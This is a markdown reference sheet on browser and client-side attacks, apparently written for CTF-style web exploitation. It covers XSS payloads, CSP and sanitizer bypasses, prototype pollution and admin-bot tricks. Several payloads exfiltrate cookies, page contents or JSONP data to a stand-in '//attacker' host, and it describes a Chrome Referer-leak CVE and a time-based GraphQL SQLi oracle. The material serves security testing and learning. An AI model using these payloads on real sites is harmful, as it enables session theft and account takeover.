# Browser and Client-Side Attacks

Use this reference for DOM and browser-side exploitation: XSS, DOM sinks, CSP bypass, client-side path abuse, XS-leaks, cache poisoning, and Node/prototype chains exposed through web apps.

## Table of Contents
- [Fast triage](#fast-triage)
- [XSS and DOM sinks](#xss-and-dom-sinks)
- [Client-side request abuse](#client-side-request-abuse)
- [CSP and sanitizer bypass](#csp-and-sanitizer-bypass)
- [Side channels and data exfiltration](#side-channels-and-data-exfiltration)
- [Node and prototype pollution](#node-and-prototype-pollution)
- [Framework notes](#framework-notes)
- [Bot / headless-browser tricks](#bot--headless-browser-tricks)
- [DOM sink recipes](#dom-sink-recipes)
- [Scriptless / CSP-strict exfiltration](#scriptless--csp-strict-exfiltration)
- [Reader-side tools](#reader-side-tools)

## Fast triage

Map browser attack surface in this order:
1. sources: URL, hash, query, postMessage, storage, WebSocket, JSON bootstrap, file metadata
2. sinks: `innerHTML`, jQuery selectors, template renderers, `eval`, framework escape hatches, URL navigators
3. controls: CSP, Trusted Types, sanitizer, MIME, cache, origin policy, bot/browser context
4. hidden state: JS bundles, source maps, DOM comments, non-rendered elements, client-side secrets

## XSS and DOM sinks

Start with context, not payload memorization.

High-yield sink families:
- reflected HTML insertion
- DOM XSS through `location.hash`, `postMessage`, or JSON parsing
- Shadow DOM and DOM clobbering
- `javascript:` scheme handling in bots or previewers
- MIME confusion where `.jpg`, `.svg`, or attachment names become active HTML

Minimal payload ladder:

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

Then move to context-specific bypasses only if needed.

## Client-side request abuse

Treat the browser as an API client you can reprogram.

Patterns:
- client-side path traversal (frontend builds `fetch("/api/" + id)`)
- parameter pollution where frontend and backend consume different values
- magic-link plus redirect chains
- cache poisoning via unkeyed headers or body/query mismatch
- request smuggling via browser/proxy desync in challenge infra

Always compare:
- what the browser sends,
- what the backend routes,
- what the cache keys on.

## CSP and sanitizer bypass

Common routes:
- whitelisted CDN behavior frameworks (`_hyperscript`, Alpine, htmx)
- missing `base-uri` enabling `<base>` hijack against nonced relative scripts
- trusted backend routes that bypass frontend sanitization
- whitelisted cloud-function domains serving attacker JS
- same-origin script gadgets with attacker-controlled MIME or content
- Unicode normalization mismatches between sanitizer and renderer

Rule:
- if script execution is blocked, switch to allowed script origin, declarative JS, or non-script exfil primitives.

## Side channels and data exfiltration

When JS exec is blocked, test read oracles instead.

Patterns:
- CSS-only exfiltration with fonts, width or container queries
- timing via image loads, cache state, or expensive prefix checks
- XS-leaks through redirects, load timing, or cross-window behavior
- XSSI / JSONP callback exfiltration
- hidden DOM or off-screen content harvesting

### Leaking a secret in the page URL (no script needed)

When a bot opens a URL containing a secret (OAuth `code`, reset token, query/fragment id) and you only control a sub-resource or sanitized `<img>`:
- Chrome `Link` referer leak (CVE-2025-4664, builds < 136.0.7103.113): the attacker sub-resource responds `Link: <//attacker/leak>; rel="preload"; as="image"; referrerpolicy="unsafe-url"` → Chrome preloads with the **full Referer including query**. Only `<img src=//attacker/x>` is required on the victim page.
- `baseURI`/`srcdoc` inheritance: a sandboxed `srcdoc` reads the embedder's full URL; older Chrome leaks it cross-origin via session-history confusion (Chromium 41487933). Needs the victim framable.
- Cookie context decides the delivery: `SameSite=Lax`/unset cookies ride only **top-level** navigations/popups, never cross-site iframes or sub-resources — so make the bot mint the secret via top-level navigation, then read the resulting URL.
- These browser bugs are build-specific: pin the version from the Dockerfile, extract it, and reproduce locally with `--host-resolver-rules`/`--disable-popup-blocking` before firing.

## Node and prototype pollution

If the target is Node-based, audit merge and nest libraries before chasing classic XSS.

High-yield chains:
- prototype pollution -> app setting override -> auth or feature bypass
- pollution -> templating gadget -> AST/code execution
- pollution -> Happy-DOM / VM escape -> server-side JS execution
- vulnerable helpers: `flatnest`, old `lodash.merge`, deep-merge utilities

Common vectors:

```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

Rule:
- separate the bug from the gadget. Pollution alone is not impact; identify what consumer reads from the prototype chain.

## Framework notes

Useful reminders:
- React controlled inputs need native setter + events, not plain `.value = ...`
- jQuery selector sinks still matter when hashchange or iframe tricks re-enable them
- Vue / template frameworks often expose constructor or render gadgets once escaping fails
- bot challenges often weaken normal browser assumptions: special URL schemes, relaxed CSP, print dialogs, hidden admin actions

## Bot / headless-browser tricks

When the sink is an admin bot (Puppeteer/Playwright) rather than a live user:

- **`javascript:` URL scheme via `new URL()`**: `new URL(input)` validates syntax only, not scheme. `javascript:fetch('/admin').then(r=>r.text()).then(t=>fetch('//attacker/?='+btoa(t)))` passes → Puppeteer navigates → executes in the bot's authenticated context. CSP/SRI on the target page are irrelevant (JS runs in navigation context, not page context).
- **`<meta http-equiv="refresh">` redirect** bypasses `script-src` CSP and reaches the bot without JS execution. Useful when HTML injection is available but scripts are blocked.
- **XS-Leak via image-load timing + GraphQL CSRF**: HTML injection → meta-refresh → bot visits attacker page → JS fires cross-origin `new Image().src = 'http://localhost/graphql?query={sqli(id:"'+guess+'")}'` — GraphQL GET requests bypass CORS preflight, and time-based SQLi (`SLEEP(1)`) is measured via the image `onerror` timing. Character-by-character flag exfil, one image request per candidate.
- **Cross-origin cookie XSS on subdomains**: from one subdomain you control, set `Set-Cookie: xss=<payload>; domain=.parent.tld`. When the bot visits a sibling subdomain that reflects the cookie, the payload executes there — even if the sibling has no direct XSS sink.
- **The injection path need not be HTTP.** Anything the app ingests and later renders is a stored-XSS source: a raw TCP telemetry/log feed, MQTT topic, filename, or device packet. If a dashboard builds rows with `el.innerHTML = record.someField`, whatever writes `someField` is your injection point — audit the non-web listeners, not just the routes.
- **You often do not need to exfiltrate.** If an unauthenticated endpoint returns the app's whole state, the payload only has to *trigger* the privileged action (`fetch('/api/command',{method:'POST',...})`); then read the result yourself. No listener, no outbound egress, nothing to catch.
- **Prove the bot actually renders before tuning payloads — two-stage canary.** A same-host port the app also listens on (and echoes back through a readable endpoint) is a zero-infrastructure oracle; browsers may connect to any non-blocked port on the same host, and `mode:"no-cors"` still sends the request:
  - `<img src="http://localhost:9000/HTMLCANARY">` — needs **no JS**; arrival proves the HTML was parsed and rendered.
  - `<img src=x onerror='fetch("http://localhost:9000/JSCANARY",{mode:"no-cors"})'>` — arrival proves **JS executed**.
  HTML canary but no JS canary = script execution blocked. Neither = the render path never ran, so no payload will ever fire.
- **CDN-dependent dashboards go inert with no egress, and the bot still looks alive.** A page whose inline script starts with `new Chart(...)` or `var socket = io()` from an external CDN dies at that top-level statement when the container cannot reach the CDN — so the socket handler *and* any later fallback `fetch('/api/state').then(render)` never register. Hoisted **function declarations** still work, so the bot's `onclick`-driven login succeeds and the admin badge flips, masking the failure. Confirm with the no-JS canary before rewriting a payload that was correct all along.

## DOM sink recipes

Distinctive sinks worth remembering payload-first (context-first triage still applies, see [xss-and-dom-sinks](#xss-and-dom-sinks)):

- **jQuery `$(location.hash)` + `hashchange`**: iframe the target with an empty hash, then mutate the hash so jQuery re-parses it as HTML: `<iframe src="https://target/#" onload="this.src+='<img src=x onerror=fetch(\'//attacker/?c=\'+document.cookie)>'">`.
- **Shadow DOM (closed roots)**: intercept `Element.prototype.attachShadow` early to capture handles to *closed* shadow roots. Escape scope with indirect eval (`(0,eval)(payload)`) or `</script>` in an inline handler.
- **DOM Clobbering + MIME mismatch**: an image upload served as `text/html` (misconfigured `Content-Type` or MIME sniffing) becomes an HTML document. `<form id="config"><input name="apiUrl" value="//attacker/">` clobbers `window.config.apiUrl` for scripts that read `config.apiUrl` without validation.
- **AngularJS 1.x sandbox escape**: override `String.prototype.charAt = String.prototype.trim` so sandbox parsing misreads token boundaries, then `$eval("''.constructor.prototype.charAt=[].join;$eval('x=alert(1)')")`. Only relevant against legacy 1.x apps.
- **Unicode case-folding XSS** (`ſ` → `s`): sanitizer regex uses ASCII-only matching (`<\s*script`), but downstream Go/Unicode-aware layer applies case folding (`strings.EqualFold`). `<ſcript>` (U+017F LATIN SMALL LETTER LONG S) evades the regex, folds to `<script>` at parse time. Cousin pairs: `ı`→`i`, `K` (U+212A KELVIN SIGN)→`k`.
- **Chrome IDNA/Unicode URL normalization**: Chrome converts fullwidth Unicode (U+FF00–U+FF5E) to ASCII equivalents *after* length/character filters run — `ｅｖｉｌ.com` (fullwidth) passes ASCII-only filters and renders as `evil.com`.
- **XSS dot-filter bypass**: when payloads must contain no `.`, use decimal IPs (`1558071511` == `92.223.45.87`) and bracket-notation property access (`document["cookie"]`, `window["location"]["href"]="//"+atob("...")`).

## Scriptless / CSP-strict exfiltration

When JS execution is fully blocked (strict CSP, Trusted Types, sanitizer coverage) but HTML/CSS injection is available:

- **CSS Font Glyph + Container Queries**: a custom `@font-face` assigns unique glyph widths per character; a `@container` query fires `background-image: url(//attacker/?c=X)` on width ranges, one HTTP request per rendered character. Exfil inline text with zero JS under strict CSP.
- **Hyperscript / Alpine.js via allow-listed CDN**: CSP `script-src cdnjs.cloudflare.com` opens `_hyperscript` (`_="on click fetch //attacker"`) and Alpine (`x-init`, `x-data="{$el.innerHTML=...}"`) — both execute code from HTML attributes that XSS sanitizers usually strip *tags* but not *attributes*.
- **CSP nonce bypass via `<base>` tag**: strict `script-src 'nonce-xxx'` with a **missing `base-uri`** directive. Inject `<base href="//attacker/">` before a nonced `<script src="app.js">` — the relative script now loads from the attacker origin under a valid nonce. Fix: always set `base-uri 'self'`.
- **CSP bypass via `<link rel="prefetch">` / `<meta http-equiv="refresh">`**: neither is covered by `script-src`; both make network requests carrying data in the URL. Useful when you have HTML injection but no JS sink.
- **CSS/JS paywall bypass**: content hidden behind a `position:fixed; z-index:99999` overlay is still in the raw HTML — `curl` or `view-source:` reads it directly. Same for `display:none` flag holders and `data-*` attributes.

## Reader-side tools

- **JSFuck decoding**: remove the trailing `()()` invocation to keep it as an expression, then `Function(payload).toString()` (or eval in a sandboxed Node REPL) reveals the original code. Avoid running the invocation directly.
- **XSSI via JSONP callback**: any endpoint that returns `func({...sensitive})` and honors `?callback=NAME` is loadable cross-origin with `<script src="//target/api?callback=steal">` — `window.steal = data => fetch('//attacker/?='+btoa(JSON.stringify(data)))`. Common in older APIs with `?callback=` reflecting into the response body.
- **Client-side HMAC bypass via leaked JS secret**: deobfuscate client JS to find the hardcoded HMAC key, then forge signatures for arbitrary requests directly from the browser console (`crypto.subtle.sign(...)`).

## See also

- `web-vulnerabilities-and-cves.md` — browser and framework CVEs
